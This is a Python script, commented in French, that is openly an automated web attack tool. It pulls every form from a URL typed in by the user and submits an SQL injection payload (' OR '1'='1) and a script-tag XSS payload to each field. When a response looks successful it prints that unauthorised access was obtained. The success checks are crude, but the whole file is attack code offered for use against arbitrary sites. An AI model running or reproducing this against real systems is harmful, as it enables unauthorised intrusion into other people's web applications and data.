import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from pwn import *

# Exploitation de l'injection SQL pour accéder à des informations sensibles
def exploit_sql_injection(url, form, vulnerable_param, payload):
    action = form.get('action')
    method = form.get('method', 'GET').upper()
    action_url = urljoin(url, action)
    
    data = {}
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name')
        if input_name:
            data[input_name] = payload if input_name == vulnerable_param else 'test'

    response = requests.post(action_url, data=data) if method == "POST" else requests.get(action_url, params=data)
    
    if "Error" not in response.text:
        print(f"Exploitation SQL réussie : {response.text}")
        return response.text
    else:
        print("Échec de l'exploitation SQL pour accès non autorisé.")
        return None

# Exploitation de XSS pour exécuter des scripts malveillants
def exploit_xss(url, form, vulnerable_param, payload):
    action = form.get('action')
    method = form.get('method', 'GET').upper()
    action_url = urljoin(url, action)

    data = {}
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name')
        if input_name:
            data[input_name] = payload if input_name == vulnerable_param else 'test'

    response = requests.post(action_url, data=data) if method == "POST" else requests.get(action_url, params=data)

    if payload in response.text:
        print(f"Exploitation XSS réussie : {response.text}")
        return response.text
    else:
        print("Échec de l'exploitation XSS.")
        return None

# Recherche des vulnérabilités dans les formulaires et exploitation
def exploit_vulnerabilities(url, forms):
    # Payloads pour exploitation
    sql_payload = "' OR '1'='1"
    xss_payload = '<script>alert(1)</script>'

    for form in forms:
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            if input_name:
                # Tentative d'exploitation SQL
                sql_result = exploit_sql_injection(url, form, input_name, sql_payload)
                if sql_result:
                    return sql_result

                # Tentative d'exploitation XSS
                xss_result = exploit_xss(url, form, input_name, xss_payload)
                if xss_result:
                    return xss_result

    print("Aucune vulnérabilité exploitable détectée.")
    return None

# Extraction des formulaires pour l'exploitation
def extract_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    return forms

# Fonction principale pour exploiter le site web
def exploit_website(url):
    forms = extract_forms(url)
    exploit_result = exploit_vulnerabilities(url, forms)
    
    if exploit_result:
        print("Exploitation réussie. Accès non autorisé obtenu.")
    else:
        print("Aucune exploitation réussie.")

if __name__ == "__main__":
    url = input("Entrez l'URL de l'application : ")
    exploit_website(url)